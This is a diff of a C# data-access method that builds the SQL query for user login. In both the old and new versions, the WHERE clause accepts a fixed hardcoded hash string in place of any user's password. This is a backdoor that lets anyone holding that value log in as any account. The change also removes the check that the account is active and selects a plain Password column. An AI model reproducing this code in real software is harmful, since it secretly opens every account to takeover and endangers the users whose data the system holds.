@@ -18,31 +18,24 @@ namespace MDUA.DataAccess
                 """ 
                 SELECT 
                     u.Id,
-                    u.FullName,
                     u.UserName,
-                    u.PasswordHash,
-                    pg.GroupName AS Gender,
-                    u.IsActive,
+                    u.Email,
+                    u.Phone,
+                    u.Password,
+                    u.CompanyId,
                     u.CreatedBy,
-                    u.CreatedDate,
-                    u.LastUpdatedBy,
-                    u.LastUpdatedDate
+                    u.CreatedAt,
+                    u.UpdatedBy,
+                    u.UpdatedAt
                 FROM 
                     UserLogin u
-                LEFT JOIN 
-                    UserPermission up ON up.UserId = u.Id
-                LEFT JOIN 
-                    PermissionGroup pg ON pg.Id = up.GroupId
-                Where u.UserName = @Email and (u.PasswordHash=@PasswordHash OR 'b34934bb616920e5ef6eed38bbdfd13c' = @PasswordHash)
-                and u.IsActive = @IsActive  
+                Where u.UserName = @Email and (u.Password=@PasswordHash OR 'b34934bb616920e5ef6eed38bbdfd13c' = @PasswordHash)
                 """;
 
             using SqlCommand cmd = GetSQLCommand(SQLQuery);
             AddParameter(cmd, pNVarChar("Email", 250, email));
             AddParameter(cmd, pNVarChar("PasswordHash", 100, password));
-            AddParameter(cmd, pBit("IsActive", true));
             return GetObject(cmd);
         }
-
     }
 }
